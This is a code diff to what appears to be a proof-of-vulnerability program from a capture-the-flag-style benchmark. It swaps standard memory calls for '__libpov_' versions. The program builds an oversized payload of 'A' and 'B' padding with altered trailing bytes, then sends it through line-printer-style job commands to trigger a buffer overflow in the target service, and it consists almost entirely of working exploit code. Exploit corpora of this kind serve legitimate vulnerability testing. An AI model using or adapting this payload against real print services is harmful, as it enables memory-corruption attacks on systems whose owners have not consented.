@@ -10,9 +10,9 @@ int main(void) {
 
    transmit_all(1, "\x02""DEFAULT\n", 9);
 
-   memcpy(&ctrl[idx], "H192.168.0.1\nProot\nNTest\nT", 26);
+   __libpov_memcpy(&ctrl[idx], "H192.168.0.1\nProot\nNTest\nT", 26);
    idx += 26;
-   memset(&ctrl[idx], 'B', 88);
+   __libpov_memset(&ctrl[idx], 'B', 88);
    idx += 88;
 
    payload = append_buf(payload, &payload_len, ctrl, idx);
@@ -22,7 +22,7 @@ int main(void) {
        payload[payload_len - 8 + i] |= 0x01;
 
    idx = 1023 - payload_len;
-   memset(ctrl, 'A', idx);
+   __libpov_memset(ctrl, 'A', idx);
    ctrl[idx++] = '\n';
 
    payload = append_buf(payload, &payload_len, ctrl, idx);
@@ -30,7 +30,7 @@ int main(void) {
 
    transmit_all(1, "\x02""1024 cfA999192.168.0.1\n", 24);
    transmit_all(1, payload, payload_len);
-   free(payload); payload = NULL; payload_len = 0;
+   __libpov_free(payload); payload = NULL; payload_len = 0;
 
    transmit_all(1, "\x03""12 dfA999192.168.0.1\n", 22);
    transmit_all(1, "This is data\x00\x00\n", 15);
